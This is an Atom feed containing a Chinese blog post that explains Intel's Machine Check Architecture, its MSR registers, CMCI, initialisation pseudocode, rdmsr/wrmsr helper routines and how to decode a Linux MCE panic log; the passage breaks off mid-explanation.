<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>ol4three</title>
  
  <subtitle>一个专注于信息安全技术的白帽子</subtitle>
  <link href="/atom.xml" rel="self"/>
  
  <link href="http://www.ol4three.com/"/>
  <updated>2021-01-22T07:14:19.954Z</updated>
  <id>http://www.ol4three.com/</id>
  
  <author>
    <name>ol4three</name>
    
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>Intel MCA与MCE硬件机制概述</title>
    <link href="http://www.ol4three.com/2021/01/22/IOT/Intel-MCA%E4%B8%8EMCE%E7%A1%AC%E4%BB%B6%E6%9C%BA%E5%88%B6%E6%A6%82%E8%BF%B0/"/>
    <id>http://www.ol4three.com/2021/01/22/IOT/Intel-MCA%E4%B8%8EMCE%E7%A1%AC%E4%BB%B6%E6%9C%BA%E5%88%B6%E6%A6%82%E8%BF%B0/</id>
    <published>2021-01-22T06:58:36.000Z</published>
    <updated>2021-01-22T07:14:19.954Z</updated>
    
    <content type="html"><![CDATA[<h1 id="简述"><a href="#简述" class="headerlink" title="简述"></a>简述</h1><p>Intel从奔腾4开始的CPU中增加了一种机制，称为MCA——Machine Check Architecture，它用来检测硬件（这里的Machine表示的就是硬件）错误，比如系统总线错误、ECC错误等等。</p><p>这套系统通过一定数量的MSR（Model Specific Register）来实现，这些MSR分为两个部分，一部分用来进行设置，另一部分用来描述发生的硬件错误。</p><p>当CPU检测到不可纠正的MCE（Machine Check Error）时，就会触发#MC（Machine Check Exception），通常软件会注册相关的函数来处理#MC，在这个函数中会通过读取MSR来收集MCE的错误信息，然后重启系统。当然由于发生的MCE可能是非常致命的，CPU直接重启了，没有办法完成MCE处理函数；甚至有可能在MCE处理函数中又触发了不可纠正的MCE，也会导致系统直接重启。</p><p>当然CPU还会检测到可纠正的MCE，当可纠正的MCE数量超过一定的阈值时，会触发CMCI（Corrected Machine Check Error Interrupt），此时软件可以捕捉到该中断并进行相应的处理。CMCI是在MCA之后才加入的，算是对MCA的一个增强，在此之前软件只能通过轮询可纠正MCE相关的MSR才能实现相关的操作。</p><h1 id="Machine-Check-MSR"><a href="#Machine-Check-MSR" class="headerlink" title="Machine Check MSR"></a>Machine Check MSR</h1><p>前面已经说过，MCA是通过一系列的MSR来实现，这里介绍下这些MSR寄存器，首先看下面的图：</p><p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/20170317231245479.png" alt="img"></p><p>上图基本包含了MCA相关的所有MSR。</p><p>它分为左右两个部分，左边的是全局的寄存器，右边表示的是多组寄存器。</p><p>i表示的是各个组的Index。这里的组有一个称呼是Error Reporting Register Bank。</p><p>MCA通过若干Bank的MSR寄存器来表示各种类型的MCE。</p><p>下面简单介绍一下这些寄存器。</p><h2 id="IA32-MCG-CAP-MSR"><a href="#IA32-MCG-CAP-MSR" class="headerlink" title="IA32_MCG_CAP MSR"></a>IA32_MCG_CAP MSR</h2><p>这个MSR描述了当前CPU处理MCA的能力，具体每个位的作用如下所示：</p><p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/20170317231629130.png" alt="img"></p><p><strong>BIT0-7</strong>：表示的是CPU支持的Bank的个数；</p><p><strong>BIT8</strong>：1表示IA32_MCG_CTL有效，如果是0的话表示无效，读取该IA32_MCG_CTL这个MSR可能发生Exception（至少在UEFI下是这样）；</p><p><strong>BIT9</strong>：1表示IA32_MCG_EXT_CTL有效，反之无效，这个与BIT8的作用类似；</p><p><strong>BIT10</strong>：1表示支持CMCI，但是CMCI是否能用还需要通过IA32_MCi_CTL2这个MSR的BIT30来使能；</p><p><strong>BIT11</strong>：1表示IA32_MCi_STATUS这个MSR的BIT56-55是保留的，BIT54-53是用来上报Threshold-based Error状态的；</p><p><strong>BIT16-23</strong>：表示存在的Extended Machine Check State寄存器的个数；</p><p><strong>BIT24</strong>：1表示CPU支持Software Error Recovery；</p><p><strong>BIT25</strong>：1表示CPU支持增强版的MCA；</p><p><strong>BIT26</strong>：1表示支持更多的错误记录（需要UEFI、ACPI的支持）；</p><p><strong>BIT27</strong>：1表示支持Local Machine Check Exception；</p><h2 id="IA32-MCG-STATUS-MSR"><a href="#IA32-MCG-STATUS-MSR" class="headerlink" title="IA32_MCG_STATUS MSR"></a>IA32_MCG_STATUS MSR</h2><p>该MSR记录了MCE发生时CPU的状态，主要的BIT位介绍如下：</p><p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/20170317232838256.png" alt="img"></p><p>这里的IP指的是Instruction Pointer，指向当前的CPU指令；</p><p>EIPV为1时表示当前的指令与导致MCE的原因相关；RIPV为1表示当前CPU从当前指令继续执行并不会有什么问题；</p><p>但是还是不知道这两个BIT有什么用处…</p><h2 id="IA32-MCG-CTL-MSR"><a href="#IA32-MCG-CTL-MSR" class="headerlink" title="IA32_MCG_CTL MSR"></a>IA32_MCG_CTL MSR</h2><p>这个寄存器的存在依赖于IA32_MCG_CAP这个MSR的BIT8。</p><p>这个寄存器主要用来Disable（写1）或者Enable（写全0）MCA功能。</p><h2 id="IA32-MCG-EXT-CTL-MSR"><a href="#IA32-MCG-EXT-CTL-MSR" class="headerlink" title="IA32_MCG_EXT_CTL MSR"></a>IA32_MCG_EXT_CTL MSR</h2><p>这个寄存器同样依赖于IA32_MCA_CAP这个MSR，这次依赖的是BIT9。该MSR的BIT位说明如下图所示：</p><p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/20170318212749233.png" alt="img"></p><p>目前有就BIT0有用，用来Disable（写1）或者Enable（写0）LMCE，这个LMCE的功能就是使硬件能够将某些MCE发送给单个的逻辑处理器，为什么要这样做目前还不是很 清楚。</p><p>以上都是全局的MSR，下面介绍每个Bank对应的MSR，</p><p>这些寄存器的第一个是IA32_MC0_CTL，它的地址一般都是400H。之后接着的是IA32_MC0_STATUS，IA32_MC0_ADDR，IA32_MC0_MISC，但是在之后并不是IA32_MC0_CTL2，而是IA32_MC1_CTL；对于IA32_MCi_CTL2来说，它的地址跟上面的这些不在一起，第一个IA32_MC0_CTL2是在280H，之后是IA32_MC1_CTL2在281H，以此类推。</p><h2 id="IA32-MCi-CTL-MSRs"><a href="#IA32-MCi-CTL-MSRs" class="headerlink" title="IA32_MCi_CTL MSRs"></a>IA32_MCi_CTL MSRs</h2><p>每个Bank的CTL的作用是用来控制在发生哪些MCA的时候来触发#MC：</p><p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/20170318214515306.png" alt="img"></p><p>这里的64个BIT位，设置某个BIT位就会使对应BIT位的MCA类型在发生时触发#MC。</p><h2 id="IA32-MCi-STATUS-MSRS"><a href="#IA32-MCi-STATUS-MSRS" class="headerlink" title="IA32_MCi_STATUS MSRS"></a>IA32_MCi_STATUS MSRS</h2><p>这类MSR的作用就是显示MCE信息：</p><p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/20170318214829962.png" alt="img"></p><p>注意只有当VAL这个BIT位（BIT63）为1时才表示发生了对应这个Bank的MCE。当MCE发生了，软件需要给这个VAL位写0来清零（如果有可能的话，因为对于不可纠正的MCE可能软件会 来不及写），不能往这位写1，会出现Exception。</p><p><strong>BIT0-15</strong>，<strong>BIT16-31</strong>：这个两个部分都表示MCE的错误类型，前者是通用的，后者是跟CPU有关的；</p><p><strong>BIT58</strong>：1表示IA32_MCi_ADDR这个MSR是有效的，反之无效；</p><p><strong>BIT59</strong>：1表示IA32_MCi_MISC这个MSR是有效的，反之无效；这两个BIT是因为不同MCE错误并不是都需要ADDR和MSIC这样的MSR；</p><p><strong>BIT60</strong>：这个位于IA32_MCi_CTL中的位是对应的，那边使能了，这里就是1；</p><p><strong>BIT61</strong>：表示MCE是不可纠正的；</p><p><strong>BIT62</strong>：表示发生了二次的MCE，这个时候到底这个Bank表示的是哪一次的MCE信息，需要根据一定的规则来确定：</p><p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/20170318220204252.png" alt="img"></p><p>这个可以先不关注。</p><p>另外还有一些寄存器在这里不介绍，具体还是看手册。</p><h2 id="IA32-MCi-ADDR-MSRs"><a href="#IA32-MCi-ADDR-MSRs" class="headerlink" title="IA32_MCi_ADDR MSRs"></a>IA32_MCi_ADDR MSRs</h2><p>这个MSR并没有特别好介绍的：</p><p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/20170318220343081.png" alt="img"></p><p>这个地址指向内存中导致MCE的代码或者数据。</p><p>注意这个地址在不同的内存模型下可以是偏移地址，虚拟地址和物理地址中的一种，这个需要MISC这个MSR来确定，下面胡讲到。</p><p>这个MSR也可以手动清零，写1会出错。</p><h2 id="IA32-MCi-MISC-MSRs"><a href="#IA32-MCi-MISC-MSRs" class="headerlink" title="IA32_MCi_MISC MSRs"></a>IA32_MCi_MISC MSRs</h2><p>这个寄存器的BIT位说明如下：</p><p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/20170318220816162.png" alt="img"></p><p>这里的Address Mode说明如下：</p><p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/20170318220902442.png" alt="img"></p><h2 id="IA32-MCi-CTL2-MSRs"><a href="#IA32-MCi-CTL2-MSRs" class="headerlink" title="IA32_MCi_CTL2 MSRs"></a>IA32_MCi_CTL2 MSRs</h2><p>这个寄存器就是为CMCI使用的，BIT位说明如下：</p><p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/20170318222559843.png" alt="img"></p><p>一个是用于使能CMCI，另一个是用来设置CMCI的阈值。</p><p>除了上述的MSR之外，在IA32_MCG_CAP这个MSR的说明中还提到过它的BIT16-23还提到了额外的MSR，它们称为Extended Machine Check State，这些MSR的描述如下：</p><p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/20170318223004472.png" alt="img"></p><p>上图实际上只展示了非64位CPU的MSR，还有一个64位CPU的MSR，这里就不再多说。</p><p>需要注意，实际上上面的这些寄存器并不需要自己一个个去对比和解析，Intel提供了一个工具叫做<strong>MCE Decoder</strong>，可以用来解析MCE。</p><p>另外在Intel的开发者手册中有专门的一个章节解析MCE错误：《CHAPTER 16 INTERPRETING MACHINE-CHECK ERROR CODES》。</p><h1 id="CMCI"><a href="#CMCI" class="headerlink" title="CMCI"></a>CMCI</h1><p>前面以及提到，CMCI是后期加入到MCA的一种机制，它将错误上报的阈值操作从原始的软件轮询变成了硬件中断触发。</p><p>一个CPU是否支持CMCI需要查看IA32_MCG_CAP的BIT10，如果该位是1就表示支持。</p><p>另外CMCI默认是关闭的，需要通过IA32_MCi_CTL2的BIT30来打开，并设置BIT0-14的阈值，注意每个Bank都要设置。</p><p>设置的时候首先写1到IA32_MCi_CTL2的BIT30，再读取这个值，如果值变成了1，说明CMCI使能了，否则就是CPU不支持CMCI；之后再写阈值到BIT0-14，如果读出来的值是0，表示不支持阈值，否则就是成功设置了阈值。</p><p>CMCI是通过Local ACPI来实现的，具体的示意图如下：</p><p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/20170319125249342.png" alt="img"></p><p>在Local ACPI Table中有专门处理CMCI的寄存器，称为LVT CMCI Register (FEE0 02F0H) ：</p><p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/20170319125831818.png" alt="img"></p><p><strong>BIT0-7</strong>：中断向量；</p><p><strong>BIT8-10</strong>：Delivery Mode，比如SMI，NMI等；</p><p><strong>BIT12</strong>：Delivery Status，0表示没有中断，1表示中断正在发生；</p><p><strong>BIT17</strong>：Interrupt Mask，0表示接收中断，1表示屏蔽中断；</p><p>关于CMCI的初始化和CMCI处理函数的实现，手册上有部分的介绍，不过没有什么源代码可以借鉴，这个不展开了。</p><h1 id="MCA的初始化"><a href="#MCA的初始化" class="headerlink" title="MCA的初始化"></a>MCA的初始化</h1><p>手册上有一个伪代码可供参考：</p><figure class="highlight vbscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">IF</span> CPU supports MCE</span><br><span class="line"><span class="keyword">THEN</span></span><br><span class="line"><span class="keyword">IF</span> CPU supports MCA</span><br><span class="line"><span class="keyword">THEN</span></span><br><span class="line"><span class="keyword">IF</span> (IA32_MCG_CAP.MCG_CTL_P = <span class="number">1</span>)</span><br><span class="line">(* IA32_MCG_CTL register <span class="keyword">is</span> present *)</span><br><span class="line"><span class="keyword">THEN</span></span><br><span class="line">IA32_MCG_CTL ← FFFFFFFFFFFFFFFFH;</span><br><span class="line">(* enables all MCA features *)</span><br><span class="line">FI</span><br><span class="line"><span class="keyword">IF</span> (IA32_MCG_CAP.MCG_LMCE_P = <span class="number">1</span> <span class="keyword">and</span> IA32_FEATURE_CONTROL.LOCK = <span class="number">1</span> <span class="keyword">and</span> IA32_FEATURE_CONTROL.LMCE_ON= <span class="number">1</span>)</span><br><span class="line">(* IA32_MCG_EXT_CTL register <span class="keyword">is</span> present <span class="keyword">and</span> platform has enabled LMCE <span class="keyword">to</span> permit system software <span class="keyword">to</span> use LMCE *)</span><br><span class="line"><span class="keyword">THEN</span></span><br><span class="line">IA32_MCG_EXT_CTL ← IA32_MCG_EXT_CTL | <span class="number">01</span>H;</span><br><span class="line">(* System software enables LMCE capability <span class="keyword">for</span> hardware <span class="keyword">to</span> signal MCE <span class="keyword">to</span> a single logical processor*)</span><br><span class="line">FI</span><br><span class="line">(* Determine number of <span class="keyword">error</span>-reporting banks supported *)</span><br><span class="line">COUNT← IA32_MCG_CAP.Count;</span><br><span class="line">MAX_BANK_NUMBER ← COUNT - <span class="number">1</span>;</span><br><span class="line"><span class="keyword">IF</span> (Processor Family <span class="keyword">is</span> <span class="number">6</span>H <span class="keyword">and</span> Processor EXTMODEL:MODEL <span class="keyword">is</span> less than <span class="number">1</span>AH)</span><br><span class="line"><span class="keyword">THEN</span></span><br><span class="line">(* Enable logging of all errors except <span class="keyword">for</span> MC0_CTL register *)</span><br><span class="line"><span class="keyword">FOR</span> <span class="keyword">error</span>-reporting banks (<span class="number">1</span> through MAX_BANK_NUMBER)</span><br><span class="line"><span class="keyword">DO</span></span><br><span class="line">IA32_MCi_CTL ← <span class="number">0</span>FFFFFFFFFFFFFFFFH;</span><br><span class="line">OD</span><br><span class="line"><span class="keyword">ELSE</span></span><br><span class="line">(* Enable logging of all errors including MC0_CTL register *)</span><br><span class="line"><span class="keyword">FOR</span> <span class="keyword">error</span>-reporting banks (<span class="number">0</span> through MAX_BANK_NUMBER)</span><br><span class="line"><span class="keyword">DO</span></span><br><span class="line">IA32_MCi_CTL ← <span class="number">0</span>FFFFFFFFFFFFFFFFH;</span><br><span class="line">OD</span><br><span class="line">FI</span><br><span class="line">(* BIOS clears all errors only <span class="keyword">on</span> power-<span class="keyword">on</span> reset *)</span><br><span class="line"><span class="keyword">IF</span> (BIOS detects Power-<span class="keyword">on</span> reset)</span><br><span class="line"><span class="keyword">THEN</span></span><br><span class="line"><span class="keyword">FOR</span> <span class="keyword">error</span>-reporting banks (<span class="number">0</span> through MAX_BANK_NUMBER)</span><br><span class="line"><span class="keyword">DO</span></span><br><span class="line">IA32_MCi_STATUS ← <span class="number">0</span>;</span><br><span class="line">OD</span><br><span class="line"><span class="keyword">ELSE</span></span><br><span class="line"><span class="keyword">FOR</span> <span class="keyword">error</span>-reporting banks (<span class="number">0</span> through MAX_BANK_NUMBER)</span><br><span class="line"><span class="keyword">DO</span></span><br><span class="line">(Optional <span class="keyword">for</span> BIOS <span class="keyword">and</span> OS) <span class="built_in">Log</span> valid errors</span><br><span class="line">(OS only) IA32_MCi_STATUS ← <span class="number">0</span>;</span><br><span class="line">OD</span><br><span class="line">FI</span><br><span class="line">FI</span><br><span class="line">Setup the Machine Check Exception (#MC) handler <span class="keyword">for</span> vector <span class="number">18</span> <span class="keyword">in</span> IDT</span><br><span class="line"><span class="keyword">Set</span> the MCE bit (bit <span class="number">6</span>) <span class="keyword">in</span> CR4 register <span class="keyword">to</span> enable Machine-Check Exceptions</span><br><span class="line">FI</span><br></pre></td></tr></table></figure><h1 id="MSR的读写"><a href="#MSR的读写" class="headerlink" title="MSR的读写"></a>MSR的读写</h1><p>x86平台读写MSR有专门的指令，分别是rdmsr和wrmsr。下面是MSR读写的一个基本实现：</p><p>gcc版本：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;**</span><br><span class="line">  Returns a 64-bit Machine Specific Register(MSR).</span><br><span class="line">  Reads and returns the 64-bit MSR specified by Index. No parameter checking is</span><br><span class="line">  performed on Index, and some Index values may cause CPU exceptions. The</span><br><span class="line">  caller must either guarantee that Index is valid, or the caller must set up</span><br><span class="line">  exception handlers to catch the exceptions. This function is only available</span><br><span class="line">  on IA-32 and X64.</span><br><span class="line">  @param  Index The 32-bit MSR index to read.</span><br><span class="line">  @return The value of the MSR identified by Index.</span><br><span class="line">**&#x2F;</span><br><span class="line">UINT64</span><br><span class="line">EFIAPI</span><br><span class="line">AsmReadMsr64 (</span><br><span class="line">  IN      UINT32                    Index</span><br><span class="line">  )</span><br><span class="line">&#123;</span><br><span class="line">  UINT32 LowData;</span><br><span class="line">  UINT32 HighData;</span><br><span class="line">  </span><br><span class="line">  __asm__ __volatile__ (</span><br><span class="line">    &quot;rdmsr&quot;</span><br><span class="line">    : &quot;&#x3D;a&quot; (LowData),   &#x2F;&#x2F; %0</span><br><span class="line">      &quot;&#x3D;d&quot; (HighData)   &#x2F;&#x2F; %1</span><br><span class="line">    : &quot;c&quot;  (Index)      &#x2F;&#x2F; %2</span><br><span class="line">    );</span><br><span class="line">    </span><br><span class="line">  return (((UINT64)HighData) &lt;&lt; 32) | LowData;</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line">&#x2F;**</span><br><span class="line">  Writes a 64-bit value to a Machine Specific Register(MSR), and returns the</span><br><span class="line">  value.</span><br><span class="line">  Writes the 64-bit value specified by Value to the MSR specified by Index. The</span><br><span class="line">  64-bit value written to the MSR is returned. No parameter checking is</span><br><span class="line">  performed on Index or Value, and some of these may cause CPU exceptions. The</span><br><span class="line">  caller must either guarantee that Index and Value are valid, or the caller</span><br><span class="line">  must establish proper exception handlers. This function is only available on</span><br><span class="line">  IA-32 and X64.</span><br><span class="line">  @param  Index The 32-bit MSR index to write.</span><br><span class="line">  @param  Value The 64-bit value to write to the MSR.</span><br><span class="line">  @return Value</span><br><span class="line">**&#x2F;</span><br><span class="line">UINT64</span><br><span class="line">EFIAPI</span><br><span class="line">AsmWriteMsr64 (</span><br><span class="line">  IN      UINT32                    Index,</span><br><span class="line">  IN      UINT64                    Value</span><br><span class="line">  )</span><br><span class="line">&#123;</span><br><span class="line">  UINT32 LowData;</span><br><span class="line">  UINT32 HighData;</span><br><span class="line"> </span><br><span class="line">  LowData  &#x3D; (UINT32)(Value);</span><br><span class="line">  HighData &#x3D; (UINT32)(Value &gt;&gt; 32);</span><br><span class="line">  </span><br><span class="line">  __asm__ __volatile__ (</span><br><span class="line">    &quot;wrmsr&quot;</span><br><span class="line">    :</span><br><span class="line">    : &quot;c&quot; (Index),</span><br><span class="line">      &quot;a&quot; (LowData),</span><br><span class="line">      &quot;d&quot; (HighData)</span><br><span class="line">    );</span><br><span class="line">    </span><br><span class="line">  return Value;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>汇编版：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">;-------------------------------------------------------</span><br><span class="line">; UINT64</span><br><span class="line">; EFIAPI</span><br><span class="line">; AsmReadMsr64 (</span><br><span class="line">;   IN UINT64  Index</span><br><span class="line">;   );</span><br><span class="line">;-------------------------------------------------------</span><br><span class="line">AsmReadMsr64    PROC</span><br><span class="line">    mov     ecx, [esp + 4]</span><br><span class="line">    rdmsr</span><br><span class="line">    ret</span><br><span class="line">AsmReadMsr64    ENDP</span><br><span class="line"> </span><br><span class="line">;-------------------------------------------------------</span><br><span class="line">; UINT64</span><br><span class="line">; EFIAPI</span><br><span class="line">; AsmWriteMsr64 (</span><br><span class="line">;   IN UINT32  Index,</span><br><span class="line">;   IN UINT64  Value</span><br><span class="line">;   );</span><br><span class="line">;--------------------------------------------------------</span><br><span class="line">AsmWriteMsr64   PROC</span><br><span class="line">    mov     edx, [esp + 12]</span><br><span class="line">    mov     eax, [esp + 8]</span><br><span class="line">    mov     ecx, [esp + 4]</span><br><span class="line">    wrmsr</span><br><span class="line">    ret</span><br><span class="line">AsmWriteMsr64   ENDP</span><br><span class="line"></span><br></pre></td></tr></table></figure><h1 id="MCE"><a href="#MCE" class="headerlink" title="MCE"></a>MCE</h1><p>Machine Check Exception (MCE) 是CPU发现硬件错误时触发的异常(exception)，中断号是18，异常的类型是abort：</p><p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20210122150211454.png" alt="image-20210122150211454"></p><h2 id="导致MCE的原因"><a href="#导致MCE的原因" class="headerlink" title="导致MCE的原因"></a>导致MCE的原因</h2><p>导致mce的原因主要有：总线故障、内存ECC校验错、cache错误、TLB错误、内部时钟错误，等等。不仅硬件故障会引起MCE，不恰当的BIOS配置、firmware bug、软件bug也有可能引起MCE。</p><p>在 Linux 系统上，如果发生的MCE错误属于可以自动纠正的类型，那么系统保持继续运行，MCE错误日志会记录在一个ring buffer中（这个ring buffer通过设备文件/dev/mcelog来访问），用 mcelog(8) 命令可以读取MCE日志，系统通常会通过cron任务或者mcelog.service把ring buffer中的MCE日志写入/var/log/mcelog文件中。如果发生的MCE错误属于无法恢复的类型，那么系统会panic，错误信息会输出在终端上和message buffer里。</p><h1 id="分析MCE"><a href="#分析MCE" class="headerlink" title="分析MCE"></a>分析MCE</h1><p>分析MCE需要参考Intel手册第3卷，15章Machine-Check Architecture和16章Interpreting Machine-Check Error Codes。由于MCE在不同型号的CPU上有差异，解读的方法也有不同，第16章是专门解释在不同的CPU型号上如何解读MCE错误码。</p><p>每个CPU上有一组寄存器称为 Machine-Check MSR (Model-Specific Register)，用于Machine-Check的控制与记录，分为全局寄存器和若干Bank寄存器（CPU的硬件单元分成若干组，每一组称为一个Bank）。当发生MCE时，错误信息记录在全局状态寄存器 MCG_STATUS MSR 和Bank寄存器 MCi_STATUS MSR 中，如下图黄色框所示：</p><p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20210122150307976.png" alt="image-20210122150307976"></p><p>分析MCE的方法，就是根据Intel手册解读上述寄存器中记录的错误信息。Linux内核把MCE的信息保存在下面的结构体中：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;arch&#x2F;x86&#x2F;include&#x2F;asm&#x2F;mce.h ：</span><br><span class="line"> </span><br><span class="line">0067 struct mce &#123;</span><br><span class="line">0068         __u64 status;  &#x2F;* 对应 IA32_MCi_STATUS MSR *&#x2F;</span><br><span class="line">0069         __u64 misc;</span><br><span class="line">0070         __u64 addr;</span><br><span class="line">0071         __u64 mcgstatus;&#x2F;*对应 IA32_MCG_STATUS MSR *&#x2F;</span><br><span class="line">0072         __u64 ip;</span><br><span class="line">0073         __u64 tsc;      &#x2F;* cpu time stamp counter *&#x2F;</span><br><span class="line">0074         __u64 time;     &#x2F;* wall time_t when error was detected *&#x2F;</span><br><span class="line">0075         __u8  cpuvendor;        &#x2F;* cpu vendor as encoded in system.h *&#x2F;</span><br><span class="line">0076         __u8  inject_flags;     &#x2F;* software inject flags *&#x2F;</span><br><span class="line">0077         __u16  pad;</span><br><span class="line">0078         __u32 cpuid;    &#x2F;* CPUID 1 EAX *&#x2F;</span><br><span class="line">0079         __u8  cs;               &#x2F;* code segment *&#x2F;</span><br><span class="line">0080         __u8  bank;     &#x2F;* machine check bank *&#x2F;</span><br><span class="line">0081         __u8  cpu;      &#x2F;* cpu number; obsolete; use extcpu now *&#x2F;</span><br><span class="line">0082         __u8  finished;   &#x2F;* entry is valid *&#x2F;</span><br><span class="line">0083         __u32 extcpu;   &#x2F;* linux cpu number that detected the error *&#x2F;</span><br><span class="line">0084         __u32 socketid; &#x2F;* CPU socket ID *&#x2F;</span><br><span class="line">0085         __u32 apicid;   &#x2F;* CPU initial apic ID *&#x2F;</span><br><span class="line">0086         __u64 mcgcap;   &#x2F;* MCGCAP MSR: machine check capabilities of CPU *&#x2F;</span><br><span class="line">0087 &#125;;</span><br></pre></td></tr></table></figure><p>下面的MCE错误信息截取自一台因MCE而crash的机器，我们以此为例来解读一下MCE信息。<br>注：产生以下信息的内核函数是：<br>static void print_mce(struct mce *m)<br>源程序：arch/x86/kernel/cpu/mcheck/mce.c<br>如果需要的话，阅读源程序可以理解输出的信息与原始数据的对应关系。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">[Hardware Error]: CPU 3: Machine Check Exception: 4 Bank 5: be00000000800400</span><br><span class="line">[Hardware Error]: TSC 128727f47a97 ADDR 3f628bd69349 MISC 1 </span><br><span class="line">[Hardware Error]: PROCESSOR 0:106a5 TIME 1450279905 SOCKET 1 APIC 14</span><br><span class="line">[Hardware Error]: Machine check: Processor context corrupt</span><br><span class="line">Kernel panic - not syncing: Fatal Machine check</span><br></pre></td></tr></table></figure><p>其中CPU和Bank是MCE的接收者：</p><ul><li>CPU 3 – 表示检测到MCE错误的是3号CPU，对应struct mce的extcpu字段；</li><li>Bank 5 – 一组硬件单元称为一个bank，每个bank对应一组machine-check寄存器；</li></ul><p>MCE的错误代码包括两部分：</p><ul><li>Machine Check Exception: 4 – 表示 IA32_MCG_STATUS MSR寄存器的状态码是4（含义见后文），对应 mcgstatus字段；</li><li>be00000000800400 – 表示 IA32_MCi_STATUS MSR寄存器中的错误码（含义见后文），对应status字段。</li></ul><h2 id="Machine-Check-Excheption-4-的含义"><a href="#Machine-Check-Excheption-4-的含义" class="headerlink" title="Machine Check Excheption: 4 的含义"></a>Machine Check Excheption: 4 的含义</h2><p>它来自全局状态寄存器 IA32_MCG_STATUS MSR，(对应struct mce的 mcgstatus字段)，只用到三个bit，如下所示。4表示machine-check in 